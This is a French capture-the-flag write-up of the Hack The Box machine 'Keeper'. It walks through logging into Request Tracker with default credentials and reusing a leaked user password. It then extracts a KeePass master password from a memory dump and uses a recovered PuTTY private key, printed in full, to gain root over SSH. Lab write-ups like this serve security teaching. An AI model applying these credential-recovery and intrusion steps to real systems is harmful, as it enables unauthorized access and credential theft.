# HTB Keeper
IP : 10.10.11.227

Room facile (version hackthebox) =)

# Enum
## Nmap
```
Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-10 07:44 EDT
Nmap scan report for 10.10.11.227
Host is up (0.046s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 35:39:d4:39:40:4b:1f:61:86:dd:7c:37:bb:4b:98:9e (ECDSA)
|_  256 1a:e9:72:be:8b:b1:05:d5:ef:fe:dd:80:d8:ef:c0:66 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.92 seconds
```
Port 80 et port 22 ouvert.
Quand on va sur la page web, ca nous fait pointer vers http://tickets.keeper.htb/rt
On va donc modifier le fichier hosts
```
10.10.11.227	tickets.keeper.htb 
10.10.11.227	keeper.htb
```
## Basic research
On tombe sur une page login, rien dans les commentaires de la pages, ni ailleurs.
On trouve le logiciel derriere, il s'agit de "Best Practical Request Tracker 4.4.4"

Les creds par defaut :
```
root:password
```
Ca fonctionne, on a accès a la page d'administration !

On trouve un compte user: 
```
lnorgaard:Welcome2023!
```
# Get the shell ? Maybe ?!
Sur RT, on trouve un ticket concernant un base keepass mais notre chère Lise à bien supprimer la pièce jointe du ticket.

Le compte de lnorgaard permet une connexion SSH, donc, pas besoins de revshell.
Le flag ce trouve dans **/home/lnorgaard/user.txt**

# Go to the root !
On fait les petits tests classic, sudo -l etc. mais rien de probant.
On trouve l'archive RT30000.zip (La pièce jointe vu dans le ticket)

Je le récupère 
```
┌──(kali㉿kali)-[~/Challenge/HackTheBox/keeper]
└─$ scp lnorgaard@10.10.11.227:~/RT30000.zip .
lnorgaard@10.10.11.227's password: 
RT30000.zip                                                                                                                                               100%   83MB   2.4MB/s   00:34 
```
et je le désarchive.
```
┌──(kali㉿kali)-[~/Challenge/HackTheBox/keeper]
└─$ unzip RT30000.zip 
Archive:  RT30000.zip
replace KeePassDumpFull.dmp? [y]es, [n]o, [A]ll, [N]one, [r]ename: A
  inflating: KeePassDumpFull.dmp     
 extracting: passcodes.kdbx
```
Il contient le dump de Keepass et la base en .kdbx.

On passe le fichier .dmp via ce [script](https://github.com/vdohney/keepass-password-dumper/tree/main) afin de récupèrer le masterpass :
```
┌──(kali㉿kali)-[~/Challenge/HackTheBox/keeper/keepass_dump]
└─$ python3 keepass_dump.py -f /home/kali/Challenge/HackTheBox/keeper/KeePassDumpFull.dmp 
[*] Searching for masterkey characters
[-] Couldn't find jump points in file. Scanning with slower method.
[*] 0:  {UNKNOWN}
[*] 2:  d
[*] 3:  g
[*] 4:  r
[*] 6:  d
[*] 7:   
[*] 8:  m
[*] 9:  e
[*] 10: d
[*] 11:  
[*] 12: f
[*] 13: l
[*] 15: d
[*] 16: e
[*] Extracted: {UNKNOWN}dgrd med flde
```
On ce retrouve avec **dgrd med flde** qui n'est pas le masterpass. 

Quand on tape cette suite de caractère sur google on tombe sur une recette d'un gateau danois : **Rødgrød Med Fløde**
Cela ne fonctionne pas non plus, en remplacant les **ø** par **o**, toujours pas. On essaye tout en minuscule :
```
rødgrød med fløde
```
Cela fonctionne !
On vois 2 entrées : 

Le compte de lnorgaard sur l'url ticket : http://tickets.keeper.htb
Le compte root pour PuTTy.
```
root:F4><3K0nd!
```
On test en SSH :
```
┌──(kali㉿kali)-[~]
└─$ ssh root@10.10.11.227                                               
root@10.10.11.227's password: 
Permission denied, please try again.
```
Le mot de passe ne fonctionne pas.
Dans les notes, on vois une clé ssh
```
PuTTY-User-Key-File-3: ssh-rsa
Encryption: none
Comment: rsa-key-20230519
Public-Lines: 6
AAAAB3NzaC1yc2EAAAADAQABAAABAQCnVqse/hMswGBRQsPsC/EwyxJvc8Wpul/D
8riCZV30ZbfEF09z0PNUn4DisesKB4x1KtqH0l8vPtRRiEzsBbn+mCpBLHBQ+81T
EHTc3ChyRYxk899PKSSqKDxUTZeFJ4FBAXqIxoJdpLHIMvh7ZyJNAy34lfcFC+LM
Cj/c6tQa2IaFfqcVJ+2bnR6UrUVRB4thmJca29JAq2p9BkdDGsiH8F8eanIBA1Tu
FVbUt2CenSUPDUAw7wIL56qC28w6q/qhm2LGOxXup6+LOjxGNNtA2zJ38P1FTfZQ
LxFVTWUKT8u8junnLk0kfnM4+bJ8g7MXLqbrtsgr5ywF6Ccxs0Et
Private-Lines: 14
AAABAQCB0dgBvETt8/UFNdG/X2hnXTPZKSzQxxkicDw6VR+1ye/t/dOS2yjbnr6j
oDni1wZdo7hTpJ5ZjdmzwxVCChNIc45cb3hXK3IYHe07psTuGgyYCSZWSGn8ZCih
kmyZTZOV9eq1D6P1uB6AXSKuwc03h97zOoyf6p+xgcYXwkp44/otK4ScF2hEputY
f7n24kvL0WlBQThsiLkKcz3/Cz7BdCkn+Lvf8iyA6VF0p14cFTM9Lsd7t/plLJzT
VkCew1DZuYnYOGQxHYW6WQ4V6rCwpsMSMLD450XJ4zfGLN8aw5KO1/TccbTgWivz
UXjcCAviPpmSXB19UG8JlTpgORyhAAAAgQD2kfhSA+/ASrc04ZIVagCge1Qq8iWs
OxG8eoCMW8DhhbvL6YKAfEvj3xeahXexlVwUOcDXO7Ti0QSV2sUw7E71cvl/ExGz
in6qyp3R4yAaV7PiMtLTgBkqs4AA3rcJZpJb01AZB8TBK91QIZGOswi3/uYrIZ1r
SsGN1FbK/meH9QAAAIEArbz8aWansqPtE+6Ye8Nq3G2R1PYhp5yXpxiE89L87NIV
09ygQ7Aec+C24TOykiwyPaOBlmMe+Nyaxss/gc7o9TnHNPFJ5iRyiXagT4E2WEEa
xHhv1PDdSrE8tB9V8ox1kxBrxAvYIZgceHRFrwPrF823PeNWLC2BNwEId0G76VkA
AACAVWJoksugJOovtA27Bamd7NRPvIa4dsMaQeXckVh19/TF8oZMDuJoiGyq6faD
AF9Z7Oehlo1Qt7oqGr8cVLbOT8aLqqbcax9nSKE67n7I5zrfoGynLzYkd3cETnGy
NNkjMjrocfmxfkvuJ7smEFMg7ZywW7CBWKGozgz67tKz9Is=
Private-MAC: b0a0fd2edf4f0e557200121aa673732c9e76750739db05adc3ab65ec34c55cb0
```
C'est une clé généré avec PuttY. Nous devont la modifier pour utiliser le client ssh de linux.
Il nous faut Puttygen :
```
sudo apt install putty-tools
```
Je vais donc l'enregistrer dans un fichier **.ppk** puis la modifier en **.pem** avec puttygen:
```
┌──(kali㉿kali)-[~/Challenge/HackTheBox/keeper]
└─$ puttygen keepass.ppk -O private-openssh -o keeper.pem
```
et nous voila connecter en root:
```
┌──(kali㉿kali)-[~/Challenge/HackTheBox/keeper]
└─$ ssh root@10.10.11.227 -i keeper.pem                  
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 5.15.0-78-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

You have new mail.
Last login: Tue Aug  8 19:00:06 2023 from 10.10.14.41
root@keeper:~#
```
le flag ce trouve dans **/root/root.txt**

Pour une fois, celle-ci est effectivement très facile !
Enjoy !
